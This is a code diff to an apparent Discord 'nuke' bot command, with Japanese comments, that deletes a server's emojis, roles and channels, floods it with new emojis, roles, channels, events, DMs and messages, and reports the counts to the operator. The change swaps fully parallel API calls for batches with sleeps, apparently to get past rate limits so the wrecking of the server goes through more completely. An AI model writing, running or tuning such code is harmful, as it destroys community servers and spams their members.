@@ -45,6 +45,9 @@ async def masumani(ctx):
     emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
     await user.send(f'絵文字削除: {emoji_deleted}個')
 
+    # 待機
+    await asyncio.sleep(1)
+
     # アイコンダウンロード
     icon_bytes = None
     try:
@@ -55,31 +58,49 @@ async def masumani(ctx):
     except:
         pass
 
-    # 2. 絵文字作成（並列）
+    # 2. 絵文字作成（バッチ処理）
     emoji_created = 0
     if icon_bytes:
         try:
             max_emojis = guild.emoji_limit
-            emoji_tasks = [guild.create_custom_emoji(name=f'emoji{i}', image=icon_bytes) for i in range(max_emojis)]
-            emoji_results = await asyncio.gather(*emoji_tasks, return_exceptions=True)
-            emoji_created = sum(1 for r in emoji_results if not isinstance(r, Exception))
+            for i in range(0, max_emojis, 5):
+                batch = min(5, max_emojis - i)
+                emoji_tasks = [guild.create_custom_emoji(name=f'emoji{i+j}', image=icon_bytes) for j in range(batch)]
+                emoji_results = await asyncio.gather(*emoji_tasks, return_exceptions=True)
+                emoji_created += sum(1 for r in emoji_results if not isinstance(r, Exception))
+                await asyncio.sleep(0.5)
         except:
             pass
     await user.send(f'絵文字作成: {emoji_created}個')
 
-    # 3. ロール削除（並列）
-    role_delete_tasks = [role.delete() for role in guild.roles if role.name != '@everyone' and not role.managed]
-    role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
-    role_deleted = sum(1 for r in role_delete_results if not isinstance(r, Exception))
+    # 待機
+    await asyncio.sleep(1)
+
+    # 3. ロール削除（バッチ処理）
+    roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed]
+    role_deleted = 0
+    for i in range(0, len(roles_to_delete), 10):
+        batch = roles_to_delete[i:i+10]
+        role_delete_tasks = [role.delete() for role in batch]
+        role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
+        role_deleted += sum(1 for r in role_delete_results if not isinstance(r, Exception))
+        await asyncio.sleep(0.5)
     await user.send(f'ロール削除: {role_deleted}個')
 
-    # 4. ロール作成（並列）
-    role_tasks = []
-    for i in range(role_count):
-        color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
-        role_tasks.append(guild.create_role(name=role_name, color=color))
-    role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
-    role_created = sum(1 for r in role_results if not isinstance(r, Exception))
+    # 待機
+    await asyncio.sleep(1)
+
+    # 4. ロール作成（バッチ処理）
+    role_created = 0
+    for i in range(0, role_count, 10):
+        batch = min(10, role_count - i)
+        role_tasks = []
+        for j in range(batch):
+            color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
+            role_tasks.append(guild.create_role(name=role_name, color=color))
+        role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
+        role_created += sum(1 for r in role_results if not isinstance(r, Exception))
+        await asyncio.sleep(0.5)
     await user.send(f'ロール作成: {role_created}個')
 
     # 5. DM送信（並列）
@@ -129,17 +150,32 @@ async def masumani(ctx):
     event_created = sum(1 for r in event_results if not isinstance(r, Exception))
     await user.send(f'イベント作成: {event_created}個')
 
-    # 8. チャンネル削除（並列）
-    channel_delete_tasks = [channel.delete() for channel in guild.channels]
-    channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
-    deleted_count = sum(1 for r in channel_delete_results if not isinstance(r, Exception))
+    # 8. チャンネル削除（バッチ処理）
+    channels_to_delete = list(guild.channels)
+    deleted_count = 0
+    for i in range(0, len(channels_to_delete), 10):
+        batch = channels_to_delete[i:i+10]
+        channel_delete_tasks = [channel.delete() for channel in batch]
+        channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
+        deleted_count += sum(1 for r in channel_delete_results if not isinstance(r, Exception))
+        await asyncio.sleep(0.5)
     await user.send(f'チャンネル削除: {deleted_count}個')
 
-    # 9. チャンネル作成（並列）
-    channel_tasks = [guild.create_text_channel(name=channel_name) for i in range(channel_count)]
-    channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
-    created_channels = [r for r in channel_results if not isinstance(r, Exception)]
-    created_count = len(created_channels)
+    # 待機
+    await asyncio.sleep(1)
+
+    # 9. チャンネル作成（バッチ処理）
+    created_channels = []
+    created_count = 0
+    for i in range(0, channel_count, 10):
+        batch = min(10, channel_count - i)
+        channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
+        channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
+        for r in channel_results:
+            if not isinstance(r, Exception):
+                created_channels.append(r)
+                created_count += 1
+        await asyncio.sleep(0.5)
     await user.send(f'チャンネル作成: {created_count}個')
 
     # 10. メッセージ送信（全チャンネル同時）
